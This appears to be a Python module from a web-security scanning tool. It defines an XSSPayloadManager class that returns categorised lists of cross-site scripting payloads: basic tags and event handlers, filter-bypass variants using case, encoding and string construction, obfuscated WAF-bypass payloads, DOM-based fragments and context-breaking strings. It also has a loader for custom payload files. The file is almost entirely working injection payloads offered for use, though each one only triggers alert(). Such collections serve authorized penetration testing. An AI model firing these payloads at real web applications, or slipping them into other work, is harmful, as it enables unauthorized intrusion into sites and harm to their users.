"""
Advanced XSS payload collection and management
"""

class XSSPayloadManager:
    """Manages different categories of XSS payloads"""
    
    @staticmethod
    def get_basic_payloads():
        """Basic XSS payloads for initial testing"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
        ]
    
    @staticmethod
    def get_advanced_payloads():
        """Advanced XSS payloads for filter bypass"""
        return [
            # Case variations
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<SCRIPT>alert('XSS')</SCRIPT>",
            
            # Encoding bypasses
            "%3Cscript%3Ealert('XSS')%3C/script%3E",
            "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            
            # Double encoding
            "%253Cscript%253Ealert('XSS')%253C/script%253E",
            
            # Unicode bypasses
            "<script>alert('XSS\u0027)</script>",
            "<script>alert('XSS\u0022)</script>",
            
            # String construction
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<script>alert(/XSS/)</script>",
            "<script>alert`XSS`</script>",
            
            # Context breaking
            "'\"><script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            
            # Event handlers
            "\" onmouseover=alert('XSS') \"",
            "' onmouseover=alert('XSS') '",
            "\" onfocus=alert('XSS') autofocus=\"",
            
            # SVG payloads
            "<svg><script>alert('XSS')</script></svg>",
            "<svg onload=alert('XSS')></svg>",
            "<svg><g/onload=alert('XSS')></svg>",
            "<svg><animatetransform onbegin=alert('XSS')>",
            
            # Math ML
            "<math><mi//xlink:href=\"data:x,<script>alert('XSS')</script>\">",
            
            # Template injection
            "{{constructor.constructor('alert(\"XSS\")')()}}",
            "${alert('XSS')}",
            "#{alert('XSS')}",
            
            # Filter bypasses
            "<img src=\"x\" onerror=\"alert('XSS')\">",
            "<body onload=alert('XSS')>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
            
            # Polyglot payloads
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert('XSS')//'>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            
            # PHP specific
            "<?php echo '<script>alert(\"XSS\")</script>'; ?>",
            
            # ASP specific
            "<%=alert('XSS')%>",
            
            # JSP specific
            "<%=alert('XSS')%>",
        ]
    
    @staticmethod
    def get_waf_bypass_payloads():
        """Payloads designed to bypass Web Application Firewalls"""
        return [
            # Obfuscated scripts
            "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
            "<script>window['alert']('XSS')</script>",
            "<script>window['al'+'ert']('XSS')</script>",
            
            # Using different events
            "<details open ontoggle=alert('XSS')>",
            "<marquee onstart=alert('XSS')>",
            "<isindex action=javascript:alert('XSS') type=submit>",
            
            # HTML5 specific
            "<video poster=javascript:alert('XSS')>",
            "<source src=javascript:alert('XSS')>",
            
            # Using forms
            "<form><button formaction=javascript:alert('XSS')>XSS",
            
            # Mixed case with quotes
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<script>alert(\"XSS\")</script>",
            
            # Using hex encoding
            "<script>alert('\\x58\\x53\\x53')</script>",
            
            # Using octal encoding
            "<script>alert('\\130\\123\\123')</script>",
            
            # Whitespace variations
            "<script >alert('XSS')</script>",
            "<script\x0Atype='text/javascript'>alert('XSS')</script>",
            "<script\x0Dtype='text/javascript'>alert('XSS')</script>",
            
            # Using eval alternatives
            "<script>Function('alert(\"XSS\")')();</script>",
            "<script>setTimeout('alert(\"XSS\")',1)</script>",
            "<script>setInterval('alert(\"XSS\")',1)</script>",
        ]
    
    @staticmethod
    def get_dom_based_payloads():
        """Payloads specifically for DOM-based XSS"""
        return [
            # Fragment-based
            "#<script>alert('DOM-XSS')</script>",
            "#<img src=x onerror=alert('DOM-XSS')>",
            "#javascript:alert('DOM-XSS')",
            
            # Hash-based navigation
            "#!<script>alert('DOM-XSS')</script>",
            
            # Using document properties
            "#';alert(document.domain);//",
            "#\";alert(document.domain);//",
            
            # Location-based
            "javascript:alert(location.hash)",
            "javascript:alert(location.search)",
            
            # postMessage exploitation
            "<script>window.postMessage('<img src=x onerror=alert(\"DOM-XSS\")>','*')</script>",
        ]
    
    @staticmethod
    def get_context_specific_payloads():
        """Payloads for specific injection contexts"""
        return {
            'html_attribute': [
                "\" onmouseover=alert('XSS') \"",
                "' onmouseover=alert('XSS') '",
                "\" autofocus onfocus=alert('XSS') \"",
            ],
            'javascript_string': [
                "';alert('XSS');//",
                "\";alert('XSS');//",
                "\\';alert('XSS');//",
            ],
            'html_comment': [
                "--><script>alert('XSS')</script><!--",
                "--!><script>alert('XSS')</script><!--",
            ],
            'css_context': [
                "</style><script>alert('XSS')</script><style>",
                "expression(alert('XSS'))",
                "javascript:alert('XSS')",
            ],
            'url_parameter': [
                "javascript:alert('XSS')",
                "data:text/html,<script>alert('XSS')</script>",
                "vbscript:alert('XSS')",
            ]
        }
    
    @classmethod
    def get_all_payloads(cls):
        """Get all available payloads"""
        all_payloads = []
        all_payloads.extend(cls.get_basic_payloads())
        all_payloads.extend(cls.get_advanced_payloads())
        all_payloads.extend(cls.get_waf_bypass_payloads())
        all_payloads.extend(cls.get_dom_based_payloads())
        
        # Add context-specific payloads
        context_payloads = cls.get_context_specific_payloads()
        for context, payloads in context_payloads.items():
            all_payloads.extend(payloads)
        
        return list(set(all_payloads))  # Remove duplicates
    
    @classmethod
    def load_custom_payloads(cls, file_path):
        """Load custom payloads from file"""
        try:
            with open(file_path, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"Custom payload file not found: {file_path}")
            return []
        except Exception as e:
            print(f"Error loading custom payloads: {e}")
            return []
